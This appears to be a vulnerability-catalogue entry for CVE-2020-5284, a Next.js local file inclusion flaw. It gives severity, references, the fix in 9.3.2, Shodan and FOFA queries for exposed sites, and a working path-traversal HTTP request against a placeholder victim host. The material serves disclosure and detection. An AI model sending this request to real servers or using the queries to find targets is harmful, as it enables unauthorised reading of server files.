---
layout: "post"
cve_id: "CVE-2020-5284"
title: "Next.js <9.3.2 - Local File Inclusion"
pcap: true
pcap_path: "/pcaps/2020/CVE-2020-5284.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-5284.yaml"
author: "rootxharsh,iamnoooob,dwisiswant0"
severity: "medium"
impact: "An attacker can exploit this vulnerability to read sensitive files on the server, potentially leading to unauthorized access or information disclosure.
"
remediation: "This issue is fixed in version 9.3.2."
reference:
  - "https://github.com/zeit/next.js/releases/tag/v9.3.2"
  - "https://github.com/zeit/next.js/security/advisories/GHSA-fq77-7p7r-83rj"
  - "https://nvd.nist.gov/vuln/detail/CVE-2020-5284"
  - "https://github.com/Z0fhack/Goby_POC"
  - "https://github.com/merlinepedra/nuclei-templates"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N', 'cvss-score': 4.3, 'cve-id': 'CVE-2020-5284', 'cwe-id': 'CWE-22,CWE-23', 'epss-score': 0.79765, 'epss-percentile': 0.99055, 'cpe': 'cpe:2.3:a:zeit:next.js:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 1, 'vendor': 'zeit', 'product': 'next.js', 'shodan-query': ['http.html:"/_next/static"', 'cpe:"cpe:2.3:a:zeit:next.js"'], 'fofa-query': 'body="/_next/static"'}"
tags:
  - "cve"
  - "cve2020"
  - "nextjs"
  - "lfi"
  - "zeit"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
Next.js versions before 9.3.2 are vulnerable to local file inclusion. An attacker can craft special requests to access files in the dist directory (.next). This does not affect files outside of the dist directory (.next). In general, the dist directory only holds build assets unless your application intentionally stores other assets under this directory.

## ðŸŒ HTTP Request
```nohighlight
GET /_next/static/../server/pages-manifest.json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

